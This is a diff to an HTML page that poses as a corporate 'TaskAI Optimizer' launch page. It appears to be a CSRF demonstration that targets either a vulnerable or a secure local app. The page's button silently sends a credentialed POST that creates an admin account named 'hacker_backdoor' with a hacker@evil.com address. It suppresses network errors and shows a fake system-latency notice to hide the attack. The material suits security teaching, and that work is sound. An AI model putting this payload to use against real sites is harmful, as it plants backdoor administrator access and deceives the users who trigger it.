@@ -4,8 +4,27 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>CorpoTech Solutions - TaskAI Optimizer</title>
-    <!-- Using the exact same CSS as the real app -->
     <link rel="stylesheet" href="http://localhost:5000/static/css/style.css">
+    <style>
+        .target-selector {
+            background: white;
+            border: 2px solid #e74c3c;
+            padding: 1rem;
+            border-radius: 8px;
+            margin-bottom: 2rem;
+            text-align: left;
+            max-width: 350px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .target-selector select {
+            width: 100%;
+            padding: 10px;
+            border-radius: 4px;
+            border: 1px solid #ccc;
+            font-size: 1rem;
+        }
+    </style>
 </head>
 <body>
 
@@ -21,22 +40,26 @@
     <div class="container">
         <div class="form-container" style="margin-top: 4rem; max-width: 650px;">
             
+            <!-- THE DEMO SELECTOR -->
+            <div class="target-selector">
+                <label style="font-weight: bold; display: block; margin-bottom: 10px;">Demo Target Environment:</label>
+                <select id="target-url">
+                    <option value="http://localhost:5000">Vulnerable App (Port 5000)</option>
+                    <option value="http://localhost:5001">Secure App (Port 5001)</option>
+                </select>
+            </div>
+
             <h2 style="font-size: 2rem; margin-bottom: 2rem;">🚀 Introducing TaskAI Optimizer</h2>
             
-            <p style="font-size: 1.15rem; line-height: 1.8; color: #555; margin-bottom: 1.5rem;">
+            <p style="font-size: 1.15rem; line-height: 1.8; color: #555; margin-bottom: 2.5rem;">
                 Boost your team's productivity by 40%. Our new enterprise AI tool automatically 
-                reassigns, prioritizes, and optimizes your ongoing tasks based on deadlines and workloads.
-            </p>
-            
-            <p style="font-size: 1rem; color: #666; margin-bottom: 2.5rem;">
-                <em>Pilot program exclusively available for Department Managers.</em>
+                reassigns, prioritizes, and optimizes your ongoing tasks.
             </p>
 
-            <button id="attack-btn" class="btn btn-primary" style="padding: 1rem 2.5rem; font-size: 1.2rem;" onclick="silentAttack()">
+            <button id="attack-btn" class="btn btn-primary" style="padding: 1rem 2.5rem; font-size: 1.2rem; display: block; margin: 0 auto;" onclick="silentAttack()">
                 Launch TaskAI Optimizer
             </button>
 
-            <!-- Using the real app's .alert-warning class for the fake error -->
             <div id="fake-error" class="alert alert-warning" style="display: none; margin-top: 2rem; text-align: left; font-size: 1rem;">
                 <strong>⚠️ System Notice:</strong><br>
                 The TaskAI Optimizer module is currently experiencing high latency due to internal API migration (JIRA-8842).<br><br>
@@ -46,28 +69,26 @@
         </div>
     </div>
 
-    <div style="text-align: center; margin-top: 3rem; font-size: 0.85rem; color: #999;">
-        &copy; 2023 CorpoTech Solutions. Confidential - Internal Use Only. 
-        <br>If you did not expect this email, please contact helpdesk@corpotech.com
-    </div>
-
     <script>
         function silentAttack() {
+            // 1. Get the selected target URL
+            const targetUrl = document.getElementById('target-url').value;
+            const endpoint = targetUrl + '/admin/users/create';
+
             const formData = new FormData();
             formData.append('username', 'hacker_backdoor');
             formData.append('email', 'hacker@evil.com');
             formData.append('password', 'Hacked123!');
             formData.append('role', 'admin');
 
-            fetch('http://localhost:5000/admin/users/create', {
+            // 2. Fire the attack at the chosen target
+            fetch(endpoint, {
                 method: 'POST',
                 body: formData,
                 credentials: 'include'
-            }).catch(() => {
-                // silence any network errors
-            });
+            }).catch(() => {});
 
-            // Updated to use the new ID
+            // 3. Show the fake error
             document.getElementById('attack-btn').style.display = 'none';
             document.getElementById('fake-error').style.display = 'block';
         }
